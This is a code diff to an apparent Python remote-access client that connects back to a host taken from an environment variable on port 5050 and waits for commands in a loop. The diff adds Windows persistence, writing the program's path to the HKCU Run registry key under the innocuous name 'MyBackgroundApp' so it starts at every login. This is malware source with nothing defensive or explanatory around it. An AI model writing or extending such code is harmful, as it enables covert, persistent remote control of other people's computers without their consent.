@@ -4,14 +4,33 @@ import random
 import time
 import subprocess
 import platform
+import winreg
+import sys
 import os
+from dotenv import load_dotenv
 
-lHost = ""
+load_dotenv()
+
+lHost = lHost = os.getenv("CON")
+
 port = 5050
 
 def send(msg):
     s.send(msg.encode("UTF-8"))
+    
+def add_to_startup():
+    exe_path = sys.executable
 
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0,
+        winreg.KEY_SET_VALUE
+    )
+
+    winreg.SetValueEx(key, "MyBackgroundApp", 0, winreg.REG_SZ, exe_path)
+    winreg.CloseKey(key)
+    
 def getCommand():
     while True:
         msg = s.recv(4096)
@@ -94,4 +113,5 @@ while connected == False:
         sleepTime = random.randint(20, 30)
         time.sleep(sleepTime)
 
+add_to_startup()
 getCommand()
